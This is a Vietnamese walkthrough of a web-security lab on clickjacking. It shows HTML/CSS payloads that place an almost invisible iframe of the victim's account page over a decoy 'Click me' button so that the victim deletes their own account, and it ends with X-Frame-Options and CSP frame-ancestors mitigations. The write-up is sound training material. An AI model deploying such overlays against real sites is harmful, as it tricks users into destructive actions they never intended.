![[Pasted image 20261103172548.png]]


![[Pasted image 20261103172826.png|621]]


### 1. Phân tích & Ý tưởng khai thác

Ở bài lab này, ứng dụng web cung cấp tính năng xóa tài khoản (`Delete account`) và form này đã được bảo vệ bằng cơ chế anti-CSRF token để chống lại tấn công CSRF thông thường. Tuy nhiên, nếu server không cấu hình các header kiểm soát việc nhúng trang web vào frame (như `X-Frame-Options` hoặc CSP `frame-ancestors`), kẻ tấn công vẫn có thể thực hiện kỹ thuật **Clickjacking (UI Redressing)**.

Mục tiêu của mình là tạo một trang web bẫy (decoy site) chứa nút bấm giả ("Click me") và nhúng trang `/my-account` của nạn nhân vào trong một `<iframe>` trong suốt đặt đè lên trên. Khi nạn nhân bị lừa bấm vào nút decoy, thực chất họ đang click vào nút "Delete account" bên trong iframe. Vì hành động này do chính trình duyệt nạn nhân thực hiện trực tiếp trên giao diện thực tế của ứng dụng, CSRF token hợp lệ sẽ được gửi đi kèm với phiên đăng nhập của nạn nhân.

### 2. Quá trình khai thác

#### Bước 1: Thăm dò ứng dụng

Mình tiến hành đăng nhập vào ứng dụng bằng tài khoản được cấp (`wiener:peter`) và truy cập vào đường dẫn `/my-account`.

Kiểm tra HTTP Response Headers trả về từ server, mình nhận thấy:

* Không xuất hiện header `X-Frame-Options: DENY` hay `X-Frame-Options: SAMEORIGIN`.
* Không có directive `Content-Security-Policy: frame-ancestors`.

Điều này xác nhận trang `/my-account` hoàn toàn có thể bị nhúng qua thẻ `<iframe>` từ một domain khác.

#### Bước 2: Căn chỉnh tọa độ nút bấm (Alignment)

Mình truy cập vào **Exploit Server** của bài lab để dựng trang khai thác. Để căn chỉnh vị trí của nút "Delete account" trùng khớp với nút bấm mồi nhử trên trang của mình, mình đặt độ mờ (`opacity`) của `iframe` là `0.1`.

Payload CSS ban đầu được cấu hình như sau:

```html
<style>
    iframe {
        position: relative;
        width: 500px;
        height: 700px;
        opacity: 0.1; /* Đặt mờ để dễ quan sát vị trí thực tế */
        z-index: 2;
    }
    div {
        position: absolute;
        top: 300px;
        left: 60px;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="https://0a450084033723418112f2cd00cd0082.web-security-academy.net/my-account"></iframe>

```

Sau khi dán vào phần **Body**, mình thay thế `YOUR-LAB-ID` bằng ID lab thực tế của mình, bấm **Store** và chọn **View exploit**:

![[Pasted image 20261103174955.png|442]]
-> có vẻ ban đầu không khớp lắm , nên mình chỉnh lại payload 1 chút
* Nút mồi nhử `Test me` nằm ngay bên dưới nút `Delete account` của trang mục tiêu.
* Khi rê chuột qua chữ `Test me`, con trỏ chuột chuyển sang dạng bàn tay (pointer) của nút bấm trong iframe, chứng tỏ vị trí click đã trùng khớp hoàn toàn.
![[Pasted image 20261107120245.png|484]]
*(Lưu ý: Không tự click vào nút này trong lúc kiểm tra, tránh làm tài khoản của mình bị xóa và phải chờ lab reset).*

#### Bước 3: Hoàn thiện Payload và Kích hoạt Exploit

Sau khi xác định đúng tọa độ, mình điều chỉnh lại:

1. Đổi nội dung thẻ `<div>` thành lời mời gọi hấp dẫn hơn: `Click me`.
2. Giảm giá trị `opacity` của `iframe` xuống mức gần như tàng hình: `0.0001`.

Mã khai thác hoàn chỉnh:

```html
<style>
    iframe {
        position: relative;
        width: 500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position: absolute;
        top: 533px;
        left: 60px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>

```

Mình bấm **Store** để lưu lại payload, sau đó nhấn **Deliver exploit to victim**.

Nạn nhân mở trang exploit và click vào chữ `Click me`, đồng thời kích hoạt hành động xóa tài khoản bên trong `iframe`. Lab được giải quyết thành công (`Lab Solved`).

![[Pasted image 20261107121927.png]]
### 3. Biện pháp phòng chống (Mitigation)

Để ngăn chặn lỗ hổng Clickjacking, các ứng dụng web cần thiết lập các cơ chế phòng thủ ở tầng HTTP Response Header:

* **Content Security Policy (CSP):** Sử dụng chỉ thị `frame-ancestors` (chuẩn khuyến nghị hiện đại):
```http
Content-Security-Policy: frame-ancestors 'none';

```


* **X-Frame-Options:** Cấu hình header này để tương thích với các trình duyệt cũ hơn:
```http
X-Frame-Options: DENY

```


*(hoặc `SAMEORIGIN` nếu cần cho phép nhúng nội bộ cùng origin).*